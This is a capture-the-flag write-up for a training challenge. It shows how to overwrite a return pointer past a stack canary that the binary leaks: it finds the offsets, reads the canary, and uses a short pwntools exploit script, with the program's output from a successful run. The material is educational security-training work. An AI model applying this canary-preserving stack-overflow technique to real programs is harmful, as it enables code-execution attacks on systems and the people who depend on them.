# 04_ret_overwrite_canary Writeup

## Steps:
1. Run chall. Notice this is similar to 03 except there is also a canary. So we need to ensure the random value is preserved or the exploit will fail.
```
$ ./chall 

Your goal is to modify the return pointer @ 0x7ffeaacae2c8, to a function called 'win' in the binary.

This is the first program you have seen with protections...

This program has a canary (0xb639618eadfb000) @ 0x7ffeaacae2b8. The way to bypass this protection, and still overwrite
the return pointer, is to append its value to your crafted payload at its relative postion in your payload.

0x7ffeaacae2a0: 0x0000000000000000 0x0000000000000000 
0x7ffeaacae2b0: 0x0000000000000000 0x0b639618eadfb000 
0x7ffeaacae2c0: 0x0000000000000001 0x00007f7aa17d6ca8 

Enter input: AAAA

0x7ffeaacae2a0: 0x0000000a41414141 0x0000000000000000 
0x7ffeaacae2b0: 0x0000000000000000 0x0b639618eadfb000 
0x7ffeaacae2c0: 0x0000000000000001 0x00007f7aa17d6ca8 

You failed to overwrite the return pointer and canary.
```

Using our previous exploit, we get:
```
Enter input: 
0x7fffeca07ba0: 0x4141414141414141 0x4141414141414141 
0x7fffeca07bb0: 0x4141414141414141 0x4141414141414141 
0x7fffeca07bc0: 0x4141414141414141 0x00000000004015c6 

You overwrote the canary, but with the wrong value
```
2. Recieve the `canary` from the line printing it
3. Identify where `win` is using `objdump`
4.  Determine the distance to the canary ~ 3 set of 8 bytes = `24` bytes
5.  Determine the distance to the target variable from the canary ~ 1 set of 8 bytes = `8` bytes
6.  Create the payload
- 24 bytes of garbage to reach `canary`
- value of `canary`
- 8 bytes of garbage to reach return pointer
- address of `win`
```
from pwn import *

target = process("./chall")

var = target.recvuntil(b"This program has a canary (0x")
canary = target.recvuntil(b")")[:-1].strip().decode()

print("Canary is", canary)

canary = int(canary, 16)

win = 0x004015e6

payload = b"A"*24
payload += p64(canary)
payload += b"B"*8
payload += p64(win)

target.sendline(payload)

s = target.recvall().decode()
print(s)
```

## Solution:
```
$ python3 exploit.py
[+] Starting local process './chall': pid 35656
Canary is f18d4c7aa970c000
[+] Receiving all data: Done (706B)
[*] Process './chall' stopped with exit code 0 (pid 35656)
 @ 0x7fffeac4e218. The way to bypass this protection, and still overwrite
the return pointer, is to append its value to your crafted payload at its relative postion in your payload.

0x7fffeac4e200: 0x0000000000000000 0x0000000000000000 
0x7fffeac4e210: 0x0000000000000000 0xf18d4c7aa970c000 
0x7fffeac4e220: 0x0000000000000001 0x00007f9c6f628ca8 

Enter input: 
0x7fffeac4e200: 0x4141414141414141 0x4141414141414141 
0x7fffeac4e210: 0x4141414141414141 0xf18d4c7aa970c000 
0x7fffeac4e220: 0x4242424242424242 0x00000000004015e6 

Congrats, you successuly changed execution flow!
```
